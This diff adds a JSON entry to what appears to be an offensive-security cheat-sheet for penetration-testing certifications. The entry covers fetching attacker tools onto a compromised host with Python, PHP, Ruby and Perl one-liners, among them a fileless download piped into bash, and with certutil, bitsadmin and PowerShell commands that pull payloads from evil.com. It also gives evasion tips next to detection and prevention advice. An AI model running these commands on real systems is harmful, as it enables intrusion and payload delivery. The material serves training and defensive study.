@@ -1,0 +1,110 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "python",
+    "php",
+    "ruby",
+    "perl"
+  ],
+  "tags": [
+    "code",
+    "download",
+    "one-liner"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Code One-liners",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Python3 fetch a script from your server",
+      "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://10.10.14.12/LinEnum.sh\",\"LinEnum.sh\")'"
+    }
+  ],
+  "notes": "When wget/curl are missing, use the language already on the box: python (urllib/requests), php (file_get_contents), ruby, perl, or a JS/vbs script on Windows. One of these is almost always present.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nix-download",
+      "rel": "alternative",
+      "note": "Standard wget/curl."
+    },
+    {
+      "id": "code-upload-oneliners",
+      "rel": "alternative",
+      "note": "Same trick for exfil."
+    },
+    {
+      "id": "gs-bind-shells",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "code-download-oneliners",
+  "name": "Transfer with Code - Download One-liners",
+  "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"<url>\",\"out\")'",
+  "description": "When wget/curl are missing or blocked, any scripting interpreter can fetch a file. Handy for constrained or hardened hosts.",
+  "variations": [
+    {
+      "label": "Python 3 / 2",
+      "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'\npython2.7 -c 'import urllib;urllib.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'"
+    },
+    {
+      "label": "PHP (file_get_contents / fopen)",
+      "command": "php -r '$file = file_get_contents(\"https://<ip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'"
+    },
+    {
+      "label": "PHP fileless pipe",
+      "command": "php -r '$lines = @file(\"https://<ip>/LinEnum.sh\"); foreach ($lines as $l){ echo $l; }' | bash"
+    },
+    {
+      "label": "Ruby / Perl",
+      "command": "ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://<ip>/LinEnum.sh\")))'\nperl -e 'use LWP::Simple; getstore(\"https://<ip>/LinEnum.sh\", \"LinEnum.sh\");'"
+    },
+    {
+      "label": "Windows JScript / VBScript",
+      "command": "cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1\ncscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Scripting-language one-liners (python urllib, php file_get_contents, ruby, perl) download files where dedicated tools are absent - handy on minimal or hardened hosts.",
+    "prerequisites": "Code execution and an interpreter (python/php/ruby/perl) present, with egress to the attacker host.",
+    "impact": "Files fetched using whatever interpreter is available, routing around missing/blocked download tools.",
+    "detection": "An interpreter process making an outbound HTTP connection is anomalous; command line (auditd/4688) shows the download one-liner; new file on disk; interpreter default UA.",
+    "artifacts": "python/php/etc. in process logs with a URL; an outbound connection from the interpreter; the downloaded file.",
+    "prevention": "[MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.",
+    "evasion": "Pipe into the interpreter to avoid a disk artifact; set a UA where the language allows; use HTTPS and allowed domains.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
